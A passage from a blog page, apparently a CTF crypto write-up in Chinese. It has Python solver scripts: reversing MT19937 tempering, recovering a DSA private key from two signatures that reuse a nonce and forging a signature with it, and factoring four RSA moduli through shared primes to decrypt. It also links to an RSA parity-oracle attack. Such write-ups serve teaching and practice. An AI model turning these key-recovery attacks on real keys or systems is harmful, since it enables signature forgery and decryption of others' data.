 for i in range(32):</span><br><span class="line">        res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def untemper(v):</span><br><span class="line">    &quot;&quot;&quot; Reverses the tempering which is applied to outputs of MT19937 &quot;&quot;&quot;</span><br><span class="line">    v = unshiftRight(v, 19)</span><br><span class="line">    v = unshiftLeft(v, 17, 2245263360)</span><br><span class="line">    v = unshiftLeft(v, 9, 2029229568)</span><br><span class="line">    v = unshiftRight(v, 13)</span><br><span class="line">    return v</span><br><span class="line"></span><br><span class="line">flag1= &apos;d\x14`\xa9&apos;</span><br><span class="line">flag2=&apos;\xe3\x95;\x1a&apos;</span><br><span class="line">flag3=&apos;\xaa!\xf3\xa2&apos;</span><br><span class="line"></span><br><span class="line">print number.long_to_bytes(untemper(number.bytes_to_long(flag1))).encode(&apos;hex&apos;)</span><br><span class="line">print number.long_to_bytes(untemper(number.bytes_to_long(flag2))).encode(&apos;hex&apos;)</span><br><span class="line">print number.long_to_bytes(untemper(number.bytes_to_long(flag3))).encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>

<h2 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h2><p>找一组存在相同r的数据</p>
<ul>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/signature/dsa/#signature" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/signature/dsa/#signature</a></li>
<li><a href="https://www.jarviswang.me/?p=169" target="_blank" rel="noopener">https://www.jarviswang.me/?p=169</a></li>
</ul>
<p>PyCrypto库: <a href="https://www.dlitz.net/software/pycrypto/api/current/Crypto.PublicKey-module.html" target="_blank" rel="noopener">https://www.dlitz.net/software/pycrypto/api/current/Crypto.PublicKey-module.html</a></p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from Crypto.PublicKey import DSA</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># key = DSA.importKey(f)</span><br><span class="line"></span><br><span class="line">p = 89884656743115795410330446766305444810004136012254088951572626435286675422682176229402503492580606179917249860049739727209788038822130599201415424530376802111943477311274012282077144230261944897642709888276214865231977633092681851700371975525345570071410658086330999327910225883994595418375586127382561183191</span><br><span class="line"></span><br><span class="line">q = 1094739534860224235292878176784189923705337366681</span><br><span class="line"></span><br><span class="line">g = 45176704602678996466345491147786667514847110446672958949281105387456640601013626319027713209352510744986626134114193057293579073731880980525600350365289453025924146490115563191128377152922598073864423115154272883314941825033353881375702194460534492199607861471983318048983963024096271251226427130673857316585</span><br><span class="line"></span><br><span class="line">y = 61479767771358258196948224103790632963915961870698154860798353299911601917061489072316373651812019818071957679426946395513936475220577021289850660360631285121859875756712938541469885329065894927857856661441896764290927390640280108692341643373962441245795263751929643359369289268442230656568047041895034174663</span><br><span class="line"></span><br><span class="line">m3=27650803417371457807064002936379775828</span><br><span class="line">m4=193111848988193367504523557345609960681</span><br><span class="line"></span><br><span class="line">s3 = 969619933279812097233565740032014835031020421736</span><br><span class="line">s4 = 224560611630673652816158535380665653808929415702</span><br><span class="line">r = 221956686088729432900817425736488818196886074744</span><br><span class="line"></span><br><span class="line">ds = s4 - s3</span><br><span class="line">dm = m4 - m3</span><br><span class="line"></span><br><span class="line">k = gmpy2.mul(dm, gmpy2.invert(ds, q))</span><br><span class="line">k = gmpy2.f_mod(k, q)</span><br><span class="line"></span><br><span class="line">print &quot;k = &quot;+str(k)</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.mul(k, s3) - m3</span><br><span class="line">x = tmp * gmpy2.invert(r, q)</span><br><span class="line">x = gmpy2.f_mod(x, q)</span><br><span class="line">x=int(x)</span><br><span class="line"></span><br><span class="line">print &quot;x = &quot;+str(x)</span><br><span class="line"># text=&quot;And nothing &apos;gainst Time&apos;s scythe can make defence&quot;</span><br><span class="line"></span><br><span class="line">key = DSA.construct((y,g,p,q,x))</span><br><span class="line"></span><br><span class="line">h=334436397493699539473999398012751306876</span><br><span class="line">print key.sign(h,k)</span><br><span class="line"></span><br><span class="line"># flag&#123;Wh4t_a_Prety_Si3nature!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Prime"><a href="#Prime" class="headerlink" title="Prime"></a>Prime</h2><p>给了四个n，四个n两两都不互质，能求出每个n的四个因子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">n1p1 = gcd(n1,n2)</span><br><span class="line">n1p2 = gcd(n1,n3)</span><br><span class="line">n1p3 = gcd(n1,n4)</span><br><span class="line">n1p4 = n1/(n1p1*n1p2*n1p3)</span><br><span class="line">d1=int(gmpy2.invert(n1,(n1p1-1)*(n1p2-1)*(n1p3-1)*(n1p4-1)))</span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line"></span><br><span class="line">n2p1 = gcd(n2,n1)</span><br><span class="line">n2p2 = gcd(n2,n3)</span><br><span class="line">n2p3 = gcd(n2,n4)</span><br><span class="line">n2p4 = n2/(n2p1*n2p2*n2p3)</span><br><span class="line">d2=int(gmpy2.invert(n2,(n2p1-1)*(n2p2-1)*(n2p3-1)*(n2p4-1)))</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line">n3p1 = gcd(n3,n1)</span><br><span class="line">n3p2 = gcd(n3,n2)</span><br><span class="line">n3p3 = gcd(n3,n4)</span><br><span class="line">n3p4 = n3/(n3p1*n3p2*n3p3)</span><br><span class="line">d3=int(gmpy2.invert(n3,(n3p1-1)*(n3p2-1)*(n3p3-1)*(n3p4-1)))</span><br><span class="line">m3 = pow(c3,d3,n3)</span><br><span class="line"></span><br><span class="line">n4p1 = gcd(n4,n2)</span><br><span class="line">n4p2 = gcd(n4,n3)</span><br><span class="line">n4p3 = gcd(n4,n1)</span><br><span class="line">n4p4 = n4/(n4p1*n4p2*n4p3)</span><br><span class="line">d4=int(gmpy2.invert(n4,(n4p1-1)*(n4p2-1)*(n4p3-1)*(n4p4-1)))</span><br><span class="line">m4 = pow(c4,d4,n4)</span><br></pre></td></tr></table></figure>

<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>lsb PARITY Oracal attack</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/#rsa-parity-oracle" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/#rsa-parity-oracle</a></p>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
